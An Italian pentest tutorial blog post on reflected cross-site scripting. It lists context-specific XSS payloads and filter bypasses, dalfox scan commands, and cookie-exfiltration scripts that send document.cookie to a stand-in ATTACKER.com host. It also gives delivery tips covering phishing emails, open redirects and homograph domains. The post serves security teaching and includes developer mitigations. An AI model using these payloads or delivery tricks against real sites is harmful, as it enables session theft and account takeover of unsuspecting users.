---
title: 'Reflected XSS: come trovarlo, sfruttarlo e far eseguire il payload'
slug: reflected-xss
description: 'Guida completa al Reflected XSS: reflection point, context analysis, payload per HTML e JavaScript, delivery via link, cookie stealing, dalfox e tecniche di exploit reali.'
image: /reflected-xss.webp
draft: true
date: 2026-03-28T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - xss
  - cookie-stealing
---

**Reflected XSS** è la tipologia di Cross-Site Scripting più diffusa e la prima che incontri durante un web pentest. Il payload non viene salvato da nessuna parte: entra nella richiesta HTTP e viene riflesso direttamente nella response. Per sfruttarlo devi fare in modo che la vittima esegua la richiesta malevola — tramite link, redirect o form.

Sottovalutato rispetto allo stored XSS, ma con il vettore di delivery giusto l'impatto è identico.

→ Torna alla guida principale: [XSS Completo](https://hackita.it/articoli/xss)

***

## Come Funziona Reflected XSS

Il flusso è semplice:

1. L'applicazione prende input dall'utente (tipicamente via GET)
2. Inserisce quell'input nella response HTML senza sanitizzarlo
3. Il browser renderizza la response ed esegue il codice iniettato

```
Attacker crafts URL → Victim clicks → Browser sends request → 
Server reflects payload → Browser executes JavaScript
```

Il fatto che non sia persistente non lo rende innocuo: basta un link cliccato una volta.

***

## Trovare Reflected XSS: Metodologia

### Step 1 — Mappa i Punti di Reflection

Ogni parametro che influenza l'output HTML è un candidato. Cerca:

* Parametri GET: `?q=`, `?search=`, `?name=`, `?msg=`, `?error=`
* Messaggi di errore che mostrano l'input ("Pagina non trovata: INPUT")
* Breadcrumb e titoli pagina che riflettono categorie/path
* Redirect URL che mostrano l'origine

### Step 2 — Inietta Marker Unici

Prima di sparare payload XSS, inietta un marker innocuo e cerca dove appare nel sorgente:

```
xsstest123abc
```

Apri F12 → Elements → Cerca `xsstest123abc`. Nota il contesto esatto: sei dentro un tag? Un attributo? Una stringa JS?

### Step 3 — Testa con Payload Mirato

In base al context trovato, scegli il payload appropriato (vedi sezione payload).

### Step 4 — Verifica Encoding

```
?q=<script>alert(1)</script>
```

Controlla nella response se `<` è diventato `&lt;`. Se sì, cerca encoding bypass. Se no, il vettore è aperto.

***

## Payload Reflected XSS per Context

### HTML Body

```javascript
// Base
<script>alert(document.domain)</script>

// Senza script tag
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<video src onerror=alert(1)>
<audio src onerror=alert(1)>
```

### Dentro Attributo HTML

Il sorgente è:

```html
<input type="text" value="USER_INPUT">
```

Payload:

```javascript
// Chiudi il value, aggiungi nuovo tag
"><script>alert(1)</script>

// Inline event handler
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onblur="alert(1)" id="x
```

### Dentro Stringa JavaScript

Il sorgente è:

```html
<script>
var query = 'USER_INPUT';
</script>
```

Payload:

```javascript
// Esci dalla stringa
'; alert(1); //
'; alert(1);//
\'; alert(1);//

// Se usa double quotes
"; alert(1); //
```

### Dentro URL (href/src)

```javascript
javascript:alert(document.domain)
javascript:void(alert(1))

// Con encoding se serve
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
```

### Context Misto / Incerto

Usa un polyglot:

```javascript
'"--><img src=x onerror=alert(1)>
```

Chiude attributi, commenti HTML e inietta un tag event-based.

***

## Exploitation: Rubare Cookie in Scenari Reali

Il `alert(1)` serve solo per la proof of concept. Nei pentest reali il payload porta a cookie stealing, credential harvesting o azioni autenticate.

### Cookie Exfiltration

```javascript
<script>
new Image().src='https://ATTACKER.com/log?c=' + document.cookie;
</script>
```

Versione più robusta con tutte le informazioni utili:

```javascript
<script>
var d = {
    c: document.cookie,
    u: location.href,
    r: document.referrer,
    t: document.title
};
fetch('https://ATTACKER.com/r', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(d)
});
</script>
```

`mode: 'no-cors'` evita errori CORS silenziosamente — non leggi la response ma la richiesta parte.

***

## Delivery: Come Far Cliccare la Vittima

Reflected XSS richiede interazione. Questi sono i vettori più usati in scenari reali:

### Link Diretto

```
https://target.com/search?q=<script>alert(1)</script>
```

Problema: i caratteri `<>` nell'URL sono sospetti e spesso bloccati dai browser moderni (Chrome ha filtri parziali).

### URL Encoding

```
https://target.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

URL encoded: meno visibile, supera alcuni filtri base.

### Redirect Chain

Se il target ha un open redirect:

```
https://target.com/redirect?url=https://target.com/search?q=<payload>
```

Il link sembra puntare al dominio legittimo.

### Shortener + Homograph

Accorcia l'URL con un shortener o usa un dominio omografico (`tаrget.com` con 'a' cirillico) per mascherare il payload.

### Phishing Email / Messaggio

Il classico: email che sembra provenire dal target con un CTA che porta all'URL malevolo.

***

## Automazione con dalfox

```bash
# Scan parametro singolo
dalfox url "https://target.com/search?q=FUZZ"

# Scan con header personalizzato (sessione autenticata)
dalfox url "https://target.com/search?q=FUZZ" \
    --header "Cookie: session=tuo_token"

# Blind XSS mode (callback su tuo server)
dalfox url "https://target.com/search?q=FUZZ" \
    --blind https://ATTACKER.com/callback

# Output solo payload confermati
dalfox url "https://target.com/search?q=FUZZ" --only-discovery-mode
```

***

## Bypass Filtri Comuni

Filtri specifici per reflected XSS sono discussi in dettaglio in [XSS Filter Bypass](https://hackita.it/articoli/xss-filter-bypass). Casi rapidi:

**Tag `<script>` bloccato:**

```javascript
<img src=x onerror=alert(1)>
```

**Parentesi bloccate:**

```javascript
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>
```

**Carattere `<` encodato dal server ma non nel JS context:**

```javascript
// Se sei già dentro un tag <script>, non hai bisogno di tag brackets
'; alert(1); //
```

***

## Mitigazione (per Developer)

* **Output encoding** contestuale: HTML entity nel body, JS string escaping nei tag script
* **Input validation**: rifiuta caratteri HTML nelle variabili che non li richiedono
* **Content Security Policy** che blocchi inline scripts: `script-src 'self'`
* **Header X-XSS-Protection**: deprecato ma ancora presente su alcuni proxy

Il problema vero del reflected XSS lato dev è che spesso il vettore è dimenticato: un campo di ricerca, un messaggio "Nessun risultato per X", un URL che compare nel breadcrumb — facili da non testare in code review.

***

*Disclaimer: Usa queste tecniche solo su sistemi con autorizzazione esplicita scritta. Attività non autorizzate su sistemi altrui costituiscono reato penale (art. 615-ter c.p.).*

###### Vuoi migliorare davvero?

Per la formazione 1:1 visita **[http://hackita.it/formazione](http://hackita.it/formazione)**.
Se vuoi testare la sicurezza della tua azienda, trovi tutto su **[https://hackita.it/formazione](https://hackita.it/formazione)**.
Se invece vuoi supportare HackIta, puoi farlo qui:

[https://hackita.it/supporto](https://hackita.it/supporto)
